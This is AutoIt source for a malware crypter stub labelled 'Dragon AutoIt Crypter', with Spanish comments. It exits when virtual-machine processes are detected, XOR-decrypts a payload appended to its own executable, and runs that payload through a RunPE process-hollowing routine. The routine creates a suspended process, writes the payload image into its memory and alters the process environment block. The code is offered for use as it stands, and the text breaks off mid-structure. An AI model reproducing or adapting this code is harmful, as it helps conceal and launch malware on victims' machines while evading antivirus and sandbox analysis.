#NoTrayIcon ; Indica que no aparecera nuestro icon ao ejecutar el archivo
;==============================================;
; Dragon AutoIt Crypter M3                     ;
; Codeado por M3                               ;
; Thanks to TRANCEXX for RunPe                 ;
; Favor mantener los creditos del Autor        ;
;==============================================;

;===============================;
; Inicio Main                    ;
;===============================;


;==============================================
; Anti-Virtuales Mediante Condicion ProcessExist
 ;=============================================


If ProcessExists("vmwaretray.exe") Then
    exit
 endif
 
 If ProcessExists("Vbox.exe") Then
    exit
 endif
 

$sAppPath = @ScriptFullPath ; determinamos la ruta el ejecutable
$sKey = "1234"  ; El delimitador
$AppExe = "hola.exe"; el host del runPe 
$sArchivo = FileRead(FileOpen($sAppPath)) ; Indicamos la lectura e abertura del Archivo
$sParams = StringInstr($sArchivo, $sKey) ; Pasamos los parametros 
$sLen = $sParams + StringLen ($sKey) ; 
$sArchivo = StringMid($sArchivo,  $sLen)
Call (sInject(_Encrypt($sArchivo, $sKey))); lhamamos ao Runpe
 




;===============================;
; Xor Function                  ;
;===============================;


   Func _Encrypt($s_String,$s_Key = '2', $s_Level = 1)
	 
	 Local $s_Encrypted, $s_kc = 1
	   
	  
	   $s_Key = StringSplit($s_Key,'')
	   $s_String = StringSplit($s_String,'')
	  
	   For $x = 1 To $s_String[0]
		   $s_kc = Mod($x,$s_Key[0])
		   $s_Encrypted &= Chr(BitXOR(Asc($s_String[$x]),Asc($s_Key[$s_kc])*$s_Level))
	   Next
	  
	   Return $s_Encrypted

EndFunc



;===========================================;
; RunPe (sInject) TRANCEXX                  ;
;===========================================;

#CS =-=--=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    TITLE .........: sInject
    AUTOIT VERSION.: 3.2.12++
    LANGUAGE.......: ENGLISH
    DESCRIPTION ...: RUN BINARY EXECUTING FROM MEMORY
    =-=--=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    =-=--=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    NAME ..........: sInject
    DESCRIPTION ...: RUN BINARY EXECUTING FROM MEMORY
    SYNTAX ........: _RUNBINARY( $BBINARYIMAGE [, $SCOMMANDLINE [, $SEXEMODULE ]] )
PARAMETERS ....:
    - $BBINARYIMAGE     - A BINARY VALUE.
- $SCOMMANDLINE     - [OPTIONAL] A STRING VALUE.
- $SEXEMODULE         - [OPTIONAL] A STRING VALUE.
    RETURN VALUES .: NONE
AUTHOR(S) .....: TRANCEXX 
    REMARKS .......: WHEN IT WILL FAIL?
- IT APPEARS THAT VISTA IS DOING SOME SORT OF REBASING WHEN LOADING AN EXE. I HAVE NO IDEA WHEN THAT HAPPENS
- BUT SURE IS SMART THING TO DO IF HIGHER LEVEL OF SECURITY IS WANTED. THIS MEANS THAT EXE IS NOT PUT TO BASE
- ADDRESS (HARD CODED INSIDE EVERY EXE) BUT IS MOVED AWAY FROM THAT POINT. I'VE MADE A COMMENT IN THE CODE
- WHERE THAT MATTERS. THIS MEANS THE FUNCTION WILL FAIL FOR VISTA.
- GENERAL FAILURE WILL BE IF THE SIZE OF THE NEW EXE IS BIGGER THAN AUTOIT'S SIZE. THAT WOULD REQUIRE ALLOCATING
- MORE MEMORY TO WORK (I'M NOT DOING THAT).
- THERE IS ONE MORE SCENARIO OF FAILURE. SOMETIMES COMPILERS COMPILE WRONG (YES IT HAPPENS) AND THEN READ DATA
- WILL BE WRONG. WINDOWS IS LIKELY USING SOME METHODS TO VERIFY CRUCIAL PARTS OF THE PE FILE - THERE IS BACKUP
- SCENARIO IN CASE OF SOME ERRORS. CODE I'M POSTING USES ONLY READ DATA, THERE IS NO VERIFYING DONE.
    - IF DATA IS WRONG - FUNCTION FAILS.
    RELATED .......:
    LINK ..........: HTTP://WWW.AUTOITSCRIPT.COM/FORUM/INDEX.PHP?SHOWTOPIC=99412
    EXAMPLE .......: sInject( $BBINARYIMAGE )
#CE =-=--=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

FUNC sInject ($BBINARYIMAGE, $SCOMMANDLINE = "", $SEXEMODULE = @AUTOITEXE)
#REGION 1. DETERMINE INTERPRETER TYPE
LOCAL $FAUTOITX64 = @AUTOITX64
#REGION 2. PREDPROCESSING PASSED
LOCAL $BBINARY = BINARY($BBINARYIMAGE) ; THIS IS REDUNDANT BUT STILL...
; MAKE STRUCTURE OUT OF BINARY DATA THAT WAS PASSED
LOCAL $TBINARY = DLLSTRUCTCREATE("BYTE[" & BINARYLEN($BBINARY) & "]")
DLLSTRUCTSETDATA($TBINARY, 1, $BBINARY) ; FILL IT
; GET POINTER TO IT
LOCAL $PPOINTER = DLLSTRUCTGETPTR($TBINARY)
#REGION 3. CREATING NEW PROCESS
; STARTUPINFO STRUCTURE (ACTUALLY ALL THAT REALLY MATTERS IS ALLOCATED SPACE)
LOCAL $TSTARTUPINFO = DLLSTRUCTCREATE( _
"DWORD  CBSIZE;" & _
"PTR RESERVED;" & _
"PTR DESKTOP;" & _
"PTR TITLE;" & _
"DWORD X;" & _
"DWORD Y;" & _
"DWORD XSIZE;" & _
"DWORD YSIZE;" & _
"DWORD XCOUNTCHARS;" & _
"DWORD YCOUNTCHARS;" & _
"DWORD FILLATTRIBUTE;" & _
"DWORD FLAGS;" & _
"WORD SHOWWINDOW;" & _
"WORD RESERVED2;" & _
"PTR RESERVED2;" & _
"PTR HSTDINPUT;" & _
"PTR HSTDOUTPUT;" & _
"PTR HSTDERROR")
; THIS IS MUCH IMPORTANT. THIS STRUCTURE WILL HOLD VERY SOME IMPORTANT DATA.
LOCAL $TPROCESS_INFORMATION = DLLSTRUCTCREATE( _
"PTR PROCESS;" & _
"PTR THREAD;" & _
"DWORD PROCESSID;" & _
"DWORD THREADID")
; CREATE NEW PROCESS
LOCAL $ACALL = DLLCALL("KERNEL32.DLL", "BOOL", "CreateProcessW", _
"WSTR", $SEXEMODULE, _
"WSTR", $SCOMMANDLINE, _
"PTR", 0, _
"PTR", 0, _
"INT", 0, _
"DWORD", 4, _ ; = CREATE_SUSPENDED ; <- THIS IS ESSENTIAL
"PTR", 0, _
"PTR", 0, _
"PTR", DLLSTRUCTGETPTR($TSTARTUPINFO), _
"PTR", DLLSTRUCTGETPTR($TPROCESS_INFORMATION))
; CHECK FOR ERRORS OR FAILURE
IF @ERROR OR NOT $ACALL[0] THEN RETURN SETERROR(1, 0, 0) ; CREATEPROCESS FUNCTION OR CALL TO IT FAILED
; GET NEW PROCESS AND THREAD HANDLES:
LOCAL $HPROCESS = DLLSTRUCTGETDATA($TPROCESS_INFORMATION, "PROCESS")
LOCAL $HTHREAD = DLLSTRUCTGETDATA($TPROCESS_INFORMATION, "THREAD")
; CHECK FOR 'WRONG' BIT-NESS. NOT BECAUSE IT COULD'T BE IMPLEMENTED, BUT BESAUSE IT WOULD BE UGLYER (STRUCTURES)
IF  $FAUTOITX64 AND __RUNPE_ISWOW64PROCESS($HPROCESS) THEN
DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
RETURN SETERROR(2, 0, 0)
ENDIF
#REGION 4. FILL CONTEXT STRUCTURE
; CONTEXT STRUCTURE IS WHAT'S REALLY IMPORTANT HERE. IT'S PROCESSOR SPECIFIC.
LOCAL $IRUNFLAG, $TCONTEXT
IF  $FAUTOITX64 THEN
IF  @OSARCH = "X64" THEN
  $IRUNFLAG = 2
  $TCONTEXT = DLLSTRUCTCREATE( _
  "ALIGN 16; UINT64 P1HOME; UINT64 P2HOME; UINT64 P3HOME; UINT64 P4HOME; UINT64 P5HOME; UINT64 P6HOME;" & _ ; REGISTER PARAMETER HOME ADDRESSES
  "DWORD CONTEXTFLAGS; DWORD MXCSR;" & _ ; CONTROL FLAGS
  "WORD SEGCS; WORD SEGDS; WORD SEGES; WORD SEGFS; WORD SEGGS; WORD SEGSS; DWORD EFLAGS;" & _ ; SEGMENT REGISTERS AND PROCESSOR FLAGS
  "UINT64 DR0; UINT64 DR1; UINT64 DR2; UINT64 DR3; UINT64 DR6; UINT64 DR7;" & _ ; DEBUG REGISTERS
  "UINT64 RAX; UINT64 RCX; UINT64 RDX; UINT64 RBX; UINT64 RSP; UINT64 RBP; UINT64 RSI; UINT64 RDI; UINT64 R8; UINT64 R9; UINT64 R10; UINT64 R11; UINT64 R12; UINT64 R13; UINT64 R14; UINT64 R15;" & _ ; INTEGER REGISTERS
  "UINT64 RIP;" & _ ; PROGRAM COUNTER
  "UINT64 HEADER[4]; UINT64 LEGACY[16]; UINT64 XMM0[2]; UINT64 XMM1[2]; UINT64 XMM2[2]; UINT64 XMM3[2]; UINT64 XMM4[2]; UINT64 XMM5[2]; UINT64 XMM6[2]; UINT64 XMM7[2]; UINT64 XMM8[2]; UINT64 XMM9[2]; UINT64 XMM10[2]; UINT64 XMM11[2]; UINT64 XMM12[2]; UINT64 XMM13[2]; UINT64 XMM14[2]; UINT64 XMM15[2];" & _ ; FLOATING POINT STATE (TYPES ARE NOT CORRECT FOR SIMPLICITY REASONS!!!)
  "UINT64 VECTORREGISTER[52]; UINT64 VECTORCONTROL;" & _ ; VECTOR REGISTERS (TYPE FOR VECTORREGISTER IS NOT CORRECT FOR SIMPLICITY REASONS!!!)
  "UINT64 DEBUGCONTROL; UINT64 LASTBRANCHTORIP; UINT64 LASTBRANCHFROMRIP; UINT64 LASTEXCEPTIONTORIP; UINT64 LASTEXCEPTIONFROMRIP") ; SPECIAL DEBUG CONTROL REGISTERS
ELSE
     $IRUNFLAG = 3
  ; FIXME - ITANIUM ARCHITECTURE
  ; RETURN SPECIAL ERROR NUMBER:
  DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
  RETURN SETERROR(102, 0, 0)
ENDIF
ELSE
    $IRUNFLAG = 1
    $TCONTEXT = DLLSTRUCTCREATE( _
"DWORD CONTEXTFLAGS;" & _ ; CONTROL FLAGS
"DWORD DR0; DWORD DR1; DWORD DR2; DWORD DR3; DWORD DR6; DWORD DR7;" & _ ; CONTEXT_DEBUG_REGISTERS
"DWORD CONTROLWORD; DWORD STATUSWORD; DWORD TAGWORD; DWORD ERROROFFSET; DWORD ERRORSELECTOR; DWORD DATAOFFSET; DWORD DATASELECTOR; BYTE REGISTERAREA[80]; DWORD CR0NPXSTATE;" & _ ; CONTEXT_FLOATING_POINT
"DWORD SEGGS; DWORD SEGFS; DWORD SEGES; DWORD SEGDS;" & _ ; CONTEXT_SEGMENTS
"DWORD EDI; DWORD ESI; DWORD EBX; DWORD EDX; DWORD ECX; DWORD EAX;" & _ ; CONTEXT_INTEGER
"DWORD EBP; DWORD EIP; DWORD SEGCS; DWORD EFLAGS; DWORD ESP; DWORD SEGSS;" & _ ; CONTEXT_CONTROL
"BYTE EXTENDEDREGISTERS[512]") ; CONTEXT_EXTENDED_REGISTERS
ENDIF
; DEFINE CONTEXT_FULL
LOCAL $CONTEXT_FULL
SWITCH $IRUNFLAG
CASE 1
     $CONTEXT_FULL = 0X10007
CASE 2
  $CONTEXT_FULL = 0X100007
CASE 3
  $CONTEXT_FULL = 0X80027
ENDSWITCH
; SET DESIRED ACCESS
DLLSTRUCTSETDATA($TCONTEXT, "CONTEXTFLAGS", $CONTEXT_FULL)
; FILL CONTEXT STRUCTURE:
$ACALL = DLLCALL("KERNEL32.DLL", "BOOL", "GetThreadContext", _
"HANDLE", $HTHREAD, _
"PTR", DLLSTRUCTGETPTR($TCONTEXT))
; CHECK FOR ERRORS OR FAILURE
IF  @ERROR OR NOT $ACALL[0] THEN
DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
RETURN SETERROR(3, 0, 0) ; GETTHREADCONTEXT FUNCTION OR CALL TO IT FAILED
ENDIF
; POINTER TO PEB STRUCTURE
LOCAL $PPEB
SWITCH $IRUNFLAG
CASE 1
  $PPEB = DLLSTRUCTGETDATA($TCONTEXT, "EBX")
CASE 2
  $PPEB = DLLSTRUCTGETDATA($TCONTEXT, "RDX")
CASE 3
  ; FIXME - ITANIUM ARCHITECTURE
ENDSWITCH
#REGION 5. READ PE-FORMAT
; START PROCESSING PASSED BINARY DATA. 'READING' PE FORMAT FOLLOWS.
; FIRST IS IMAGE_DOS_HEADER
LOCAL $TIMAGE_DOS_HEADER = DLLSTRUCTCREATE( _
"CHAR MAGIC[2];" & _
"WORD BYTESONLASTPAGE;" & _
"WORD PAGES;" & _
"WORD RELOCATIONS;" & _
"WORD SIZEOFHEADER;" & _
"WORD MINIMUMEXTRA;" & _
"WORD MAXIMUMEXTRA;" & _
"WORD SS;" & _
"WORD SP;" & _
"WORD CHECKSUM;" & _
"WORD IP;" & _
"WORD CS;" & _
"WORD RELOCATION;" & _
"WORD OVERLAY;" & _
"CHAR RESERVED[8];" & _
"WORD OEMIDENTIFIER;" & _
"WORD OEMINFORMATION;" & _
"CHAR RESERVED2[20];" & _
"DWORD ADDRESSOFNEWEXEHEADER",$PPOINTER)
; SAVE THIS POINTER VALUE (IT'S STARTING ADDRESS OF BINARY IMAGE HEADERS)
LOCAL $PHEADERS_NEW = $PPOINTER
; MOVE POINTER
$PPOINTER += DLLSTRUCTGETDATA($TIMAGE_DOS_HEADER, "ADDRESSOFNEWEXEHEADER") ; MOVE TO PE FILE HEADER
; GET "MAGIC"
LOCAL $SMAGIC = DLLSTRUCTGETDATA($TIMAGE_DOS_HEADER, "MAGIC")
; CHECK IF IT'S VALID FORMAT
IF  NOT ($SMAGIC == "MZ") THEN
DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
RETURN SETERROR(4, 0, 0) ; MS-DOS HEADER MISSING.
ENDIF
; IN PLACE OF IMAGE_NT_SIGNATURE
LOCAL $TIMAGE_NT_SIGNATURE = DLLSTRUCTCREATE("DWORD SIGNATURE", $PPOINTER)
; MOVE POINTER
$PPOINTER += 4 ; SIZE OF $TIMAGE_NT_SIGNATURE STRUCTURE
; CHECK SIGNATURE
IF  DLLSTRUCTGETDATA($TIMAGE_NT_SIGNATURE, "SIGNATURE") <> 17744 THEN ; IMAGE_NT_SIGNATURE
DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
RETURN SETERROR(5, 0, 0) ; WRONG SIGNATURE. FOR PE IMAGE SHOULD BE "PE\0\0" OR 17744 DWORD.
ENDIF
; IN PLACE OF IMAGE_FILE_HEADER
LOCAL $TIMAGE_FILE_HEADER = DLLSTRUCTCREATE("WORD MACHINE;" & _
   "WORD NUMBEROFSECTIONS;" & _
   "DWORD TIMEDATESTAMP;" & _
   "DWORD POINTERTOSYMBOLTABLE;" & _
   "DWORD NUMBEROFSYMBOLS;" & _
   "WORD SIZEOFOPTIONALHEADER;" & _
   "WORD CHARACTERISTICS", _
$PPOINTER)
; I COULD CHECK HERE IF THE MODULE IS RELOCATABLE
; LOCAL $FRELOCATABLE
; IF BITAND(DLLSTRUCTGETDATA($TIMAGE_FILE_HEADER, "CHARACTERISTICS"), 1) THEN $FRELOCATABLE = FALSE
; BUT I WON'T (WILL CHECK DATA IN IMAGE_DIRECTORY_ENTRY_BASERELOC INSTEAD)
; GET NUMBER OF SECTIONS
LOCAL $INUMBEROFSECTIONS = DLLSTRUCTGETDATA($TIMAGE_FILE_HEADER, "NUMBEROFSECTIONS")
; MOVE POINTER
$PPOINTER += 20 ; SIZE OF $TIMAGE_FILE_HEADER STRUCTURE
; IN PLACE OF IMAGE_OPTIONAL_HEADER
LOCAL $TMAGIC = DLLSTRUCTCREATE("WORD MAGIC;", $PPOINTER)
LOCAL $IMAGIC = DLLSTRUCTGETDATA($TMAGIC, 1)
LOCAL $TIMAGE_OPTIONAL_HEADER
IF  $IMAGIC = 267 THEN ; X86 VERSION
IF  $FAUTOITX64 THEN
  DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
  RETURN SETERROR(6, 0, 0) ; INCOMPATIBLE VERSIONS
ENDIF
$TIMAGE_OPTIONAL_HEADER = DLLSTRUCTCREATE( _
"WORD MAGIC;" & _
"BYTE MAJORLINKERVERSION;" & _
"BYTE MINORLINKERVERSION;" & _
"DWORD SIZEOFCODE;" & _
"DWORD SIZEOFINITIALIZEDDATA;" & _
"DWORD SIZEOFUNINITIALIZEDDATA;" & _
"DWORD ADDRESSOFENTRYPOINT;" & _
"DWORD BASEOFCODE;" & _
"DWORD BASEOFDATA;" & _
"DWORD IMAGEBASE;" & _
"DWORD SECTIONALIGNMENT;" & _
"DWORD FILEALIGNMENT;" & _
"WORD MAJOROPERATINGSYSTEMVERSION;" & _
"WORD MINOROPERATINGSYSTEMVERSION;" & _
"WORD MAJORIMAGEVERSION;" & _
"WORD MINORIMAGEVERSION;" & _
"WORD MAJORSUBSYSTEMVERSION;" & _
"WORD MINORSUBSYSTEMVERSION;" & _
"DWORD WIN32VERSIONVALUE;" & _
"DWORD SIZEOFIMAGE;" & _
"DWORD SIZEOFHEADERS;" & _
"DWORD CHECKSUM;" & _
"WORD SUBSYSTEM;" & _
"WORD DLLCHARACTERISTICS;" & _
"DWORD SIZEOFSTACKRESERVE;" & _
"DWORD SIZEOFSTACKCOMMIT;" & _
"DWORD SIZEOFHEAPRESERVE;" & _
"DWORD SIZEOFHEAPCOMMIT;" & _
"DWORD LOADERFLAGS;" & _
"DWORD NUMBEROFRVAANDSIZES",$PPOINTER)
; MOVE POINTER
$PPOINTER += 96 ; SIZE OF $TIMAGE_OPTIONAL_HEADER
ELSEIF  $IMAGIC = 523 THEN ; X64 VERSION
  IF NOT $FAUTOITX64 THEN
   DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
   RETURN SETERROR(6, 0, 0) ; INCOMPATIBLE VERSIONS
  ENDIF
$TIMAGE_OPTIONAL_HEADER = DLLSTRUCTCREATE( _
"WORD MAGIC;" & _
"BYTE MAJORLINKERVERSION;" & _
    "BYTE MINORLINKERVERSION;" & _
"DWORD SIZEOFCODE;" & _
"DWORD SIZEOFINITIALIZEDDATA;" & _
"DWORD SIZEOFUNINITIALIZEDDATA;" & _
"DWORD ADDRESSOFENTRYPOINT;" & _
"DWORD BASEOFCODE;" & _
"UINT64 IMAGEBASE;" & _
"DWORD SECTIONALIGNMENT;" & _
"DWORD FILEALIGNMENT;" & _
"WORD MAJOROPERATINGSYSTEMVERSION;" & _
"WORD MINOROPERATINGSYSTEMVERSION;" & _
"WORD MAJORIMAGEVERSION;" & _
"WORD MINORIMAGEVERSION;" & _
"WORD MAJORSUBSYSTEMVERSION;" & _
"WORD MINORSUBSYSTEMVERSION;" & _
"DWORD WIN32VERSIONVALUE;" & _
"DWORD SIZEOFIMAGE;" & _
"DWORD SIZEOFHEADERS;" & _
"DWORD CHECKSUM;" & _
"WORD SUBSYSTEM;" & _
"WORD DLLCHARACTERISTICS;" & _
"UINT64 SIZEOFSTACKRESERVE;" & _
"UINT64 SIZEOFSTACKCOMMIT;" & _
"UINT64 SIZEOFHEAPRESERVE;" & _
"UINT64 SIZEOFHEAPCOMMIT;" & _
"DWORD LOADERFLAGS;" & _
    "DWORD NUMBEROFRVAANDSIZES",$PPOINTER)
; MOVE POINTER
$PPOINTER += 112 ; SIZE OF $TIMAGE_OPTIONAL_HEADER
ELSE
DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
RETURN SETERROR(6, 0, 0) ; INCOMPATIBLE VERSIONS
ENDIF
; EXTRACT ENTRY POINT ADDRESS
LOCAL $IENTRYPOINTNEW = DLLSTRUCTGETDATA($TIMAGE_OPTIONAL_HEADER, "ADDRESSOFENTRYPOINT") ; IF LOADED BINARY IMAGE WOULD START EXECUTING AT THIS ADDRESS
; AND OTHER INTERESTING INFORMATIONS
LOCAL $IOPTIONALHEADERSIZEOFHEADERSNEW = DLLSTRUCTGETDATA($TIMAGE_OPTIONAL_HEADER, "SIZEOFHEADERS")
LOCAL $POPTIONALHEADERIMAGEBASENEW = DLLSTRUCTGETDATA($TIMAGE_OPTIONAL_HEADER, "IMAGEBASE") ; ADDRESS OF THE FIRST BYTE OF THE IMAGE WHEN IT'S LOADED IN MEMORY
LOCAL $IOPTIONALHEADERSIZEOFIMAGENEW = DLLSTRUCTGETDATA($TIMAGE_OPTIONAL_HEADER, "SIZEOFIMAGE") ; THE SIZE OF THE IMAGE INCLUDING ALL HEADERS
; MOVE POINTER
$PPOINTER += 8 ; SKIPPING IMAGE_DIRECTORY_ENTRY_EXPORT
$PPOINTER += 8 ; SIZE OF $TIMAGE_DIRECTORY_ENTRY_IMPORT
$PPOINTER += 24 ; SKIPPING IMAGE_DIRECTORY_ENTRY_RESOURCE, IMAGE_DIRECTORY_ENTRY_EXCEPTION, IMAGE_DIRECTORY_ENTRY_SECURITY
; BASE RELOCATION DIRECTORY
LOCAL $TIMAGE_DIRECTORY_ENTRY_BASERELOC = DLLSTRUCTCREATE("DWORD VIRTUALADDRESS; DWORD SIZE", $PPOINTER)
; COLLECT DATA
LOCAL $PADDRESSNEWBASERELOC = DLLSTRUCTGETDATA($TIMAGE_DIRECTORY_ENTRY_BASERELOC, "VIRTUALADDRESS")
LOCAL $ISIZEBASERELOC = DLLSTRUCTGETDATA($TIMAGE_DIRECTORY_ENTRY_BASERELOC, "SIZE")
LOCAL $FRELOCATABLE
IF $PADDRESSNEWBASERELOC AND $ISIZEBASERELOC THEN $FRELOCATABLE = TRUE
IF NOT $FRELOCATABLE THEN CONSOLEWRITE("!!!NOT RELOCATABLE MODULE. I WILL TRY BUT THIS MAY NOT WORK!!!" & @CRLF) ; NOTHING CAN BE DONE HERE
; MOVE POINTER
$PPOINTER += 88 ; SIZE OF THE STRUCTURES BEFORE IMAGE_SECTION_HEADER (16 OF THEM).
#REGION 6. ALLOCATE 'NEW' MEMORY SPACE
LOCAL $FRELOCATE
LOCAL $PZEROPOINT
IF  $FRELOCATABLE THEN ; IF THE MODULE CAN BE RELOCATED THEN ALLOCATE MEMORY ANYWHERE POSSIBLE
$PZEROPOINT = __RUNPE_ALLOCATEEXESPACE($HPROCESS, $IOPTIONALHEADERSIZEOFIMAGENEW)
; IN CASE OF FAILURE TRY AT ORIGINAL ADDRESS
IF  @ERROR THEN
  $PZEROPOINT = __RUNPE_ALLOCATEEXESPACEATADDRESS($HPROCESS, $POPTIONALHEADERIMAGEBASENEW, $IOPTIONALHEADERSIZEOFIMAGENEW)
  IF  @ERROR THEN
   __RUNPE_UNMAPVIEWOFSECTION($HPROCESS, $POPTIONALHEADERIMAGEBASENEW)
   ; TRY NOW
   $PZEROPOINT = __RUNPE_ALLOCATEEXESPACEATADDRESS($HPROCESS, $POPTIONALHEADERIMAGEBASENEW, $IOPTIONALHEADERSIZEOFIMAGENEW)
   IF  @ERROR THEN
    ; RETURN SPECIAL ERROR NUMBER:
    DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
    RETURN SETERROR(101, 1, 0)
   ENDIF
  ENDIF
ENDIF
$FRELOCATE = TRUE
ELSE ; AND IF NOT TRY WHERE IT SHOULD BE
$PZEROPOINT = __RUNPE_ALLOCATEEXESPACEATADDRESS($HPROCESS, $POPTIONALHEADERIMAGEBASENEW, $IOPTIONALHEADERSIZEOFIMAGENEW)
IF  @ERROR THEN
  __RUNPE_UNMAPVIEWOFSECTION($HPROCESS, $POPTIONALHEADERIMAGEBASENEW)
  ; TRY NOW
  $PZEROPOINT = __RUNPE_ALLOCATEEXESPACEATADDRESS($HPROCESS, $POPTIONALHEADERIMAGEBASENEW, $IOPTIONALHEADERSIZEOFIMAGENEW)
  IF  @ERROR THEN
   ; RETURN SPECIAL ERROR NUMBER:
   DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
   RETURN SETERROR(101, 0, 0)
  ENDIF
ENDIF
ENDIF
; IF THERE IS NEW IMAGEBASE VALUE, SAVE IT
DLLSTRUCTSETDATA($TIMAGE_OPTIONAL_HEADER, "IMAGEBASE", $PZEROPOINT)
#REGION 7. CONSTRUCT THE NEW MODULE
; ALLOCATE ENOUGH SPACE (IN OUR SPACE) FOR THE NEW MODULE
LOCAL $TMODULE = DLLSTRUCTCREATE("BYTE[" & $IOPTIONALHEADERSIZEOFIMAGENEW & "]")
; GET POINTER
LOCAL $PMODULE = DLLSTRUCTGETPTR($TMODULE)
; HEADERS
LOCAL $THEADERS = DLLSTRUCTCREATE("BYTE[" & $IOPTIONALHEADERSIZEOFHEADERSNEW & "]", $PHEADERS_NEW)
; WRITE HEADERS TO $TMODULE
DLLSTRUCTSETDATA($TMODULE, 1, DLLSTRUCTGETDATA($THEADERS, 1))
; WRITE SECTIONS NOW. $PPOINTER IS CURRENTLY IN PLACE OF SECTIONS
LOCAL $TIMAGE_SECTION_HEADER
LOCAL $ISIZEOFRAWDATA, $PPOINTERTORAWDATA
LOCAL $IVIRTUALADDRESS, $IVIRTUALSIZE
LOCAL $TRELOCRAW
; LOOP THROUGH SECTIONS
FOR $I = 1 TO $INUMBEROFSECTIONS
$TIMAGE_SECTION_HEADER = DLLSTRUCTCREATE( _
"CHAR NAME[8];" & _
"DWORD UNIONOFVIRTUALSIZEANDPHYSICALADDRESS;" & _
"DWORD VIRTUALADDRESS;" & _
"DWORD SIZEOFRAWDATA;" & _
"DWORD POINTERTORAWDATA;" & _
"DWORD POINTERTORELOCATIONS;" & _
"DWORD POINTERTOLINENUMBERS;" & _
"WORD NUMBEROFRELOCATIONS;" & _
"WORD NUMBEROFLINENUMBERS;" & _
"DWORD CHARACTERISTICS",$PPOINTER)
; COLLECT DATA
$ISIZEOFRAWDATA = DLLSTRUCTGETDATA($TIMAGE_SECTION_HEADER, "SIZEOFRAWDATA")
$PPOINTERTORAWDATA = $PHEADERS_NEW + DLLSTRUCTGETDATA($TIMAGE_SECTION_HEADER, "POINTERTORAWDATA")
$IVIRTUALADDRESS = DLLSTRUCTGETDATA($TIMAGE_SECTION_HEADER, "VIRTUALADDRESS")
$IVIRTUALSIZE = DLLSTRUCTGETDATA($TIMAGE_SECTION_HEADER, "UNIONOFVIRTUALSIZEANDPHYSICALADDRESS")
IF  $IVIRTUALSIZE AND $IVIRTUALSIZE < $ISIZEOFRAWDATA THEN $ISIZEOFRAWDATA = $IVIRTUALSIZE
; IF THERE IS DATA TO WRITE, WRITE IT
IF  $ISIZEOFRAWDATA THEN
  DLLSTRUCTSETDATA(DLLSTRUCTCREATE("BYTE[" & $ISIZEOFRAWDATA & "]", $PMODULE + $IVIRTUALADDRESS), 1, DLLSTRUCTGETDATA(DLLSTRUCTCREATE("BYTE[" & $ISIZEOFRAWDATA & "]", $PPOINTERTORAWDATA), 1))
ENDIF
; RELOCATIONS
IF  $FRELOCATE THEN
  IF  $IVIRTUALADDRESS <= $PADDRESSNEWBASERELOC AND $IVIRTUALADDRESS + $ISIZEOFRAWDATA > $PADDRESSNEWBASERELOC THEN
   $TRELOCRAW = DLLSTRUCTCREATE("BYTE[" & $ISIZEBASERELOC & "]", $PPOINTERTORAWDATA + ($PADDRESSNEWBASERELOC - $IVIRTUALADDRESS))
  ENDIF
ENDIF
; MOVE POINTER
$PPOINTER += 40 ; SIZE OF $TIMAGE_SECTION_HEADER STRUCTURE
NEXT
; FIX RELOCATIONS
IF $FRELOCATE THEN __RUNPE_FIXRELOC($PMODULE, $TRELOCRAW, $PZEROPOINT, $POPTIONALHEADERIMAGEBASENEW, $IMAGIC = 523)
; WRITE NEWLY CONSTRUCTED MODULE TO ALLOCATED SPACE INSIDE THE $HPROCESS
$ACALL = DLLCALL("KERNEL32.DLL", "BOOL", "WriteProcessMemory", _
"HANDLE", $HPROCESS, _
"PTR", $PZEROPOINT, _
"PTR", $PMODULE, _
"DWORD_PTR", $IOPTIONALHEADERSIZEOFIMAGENEW, _
"DWORD_PTR*", 0)
; CHECK FOR ERRORS OR FAILURE
IF  @ERROR OR NOT $ACALL[0] THEN
DLLCALL("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $HPROCESS, "DWORD", 0)
RETURN SETERROR(7, 0, 0) ; WRITEPROCESSMEMORY FUNCTION OR CALL TO IT WHILE WRITTING NEW MODULE BINARY
ENDIF
#REGION 8. PEB IMAGEBASEADDRESS MANIPULATION
; PEB STRUCTURE DEFINITION
LOCAL $TPEB = DLLSTRUCTCREATE( _
"BYTE INHERITEDADDRESSSPACE;" & _
"BYTE READIMAGEFILEEXECOPTIONS;" & _
"BYTE BEINGDEBUGGED;" & _
"BYTE SPARE;" & _
"PTR MUTANT;" & _
"PTR IMAGEBASEADDRESS;" & _
"PTR LOADERDATA;" & _
"PTR PROCESSPARAMETERS;" & _
"PTR SUBSYSTEMDATA;" & _
"PTR PROCESSHEAP;" & _
"PTR FASTPEBLOCK;" & _
"PTR FASTPEBLOCKROUTINE;" & _
"PTR FASTPEBUNLOCKROUTINE;" & _
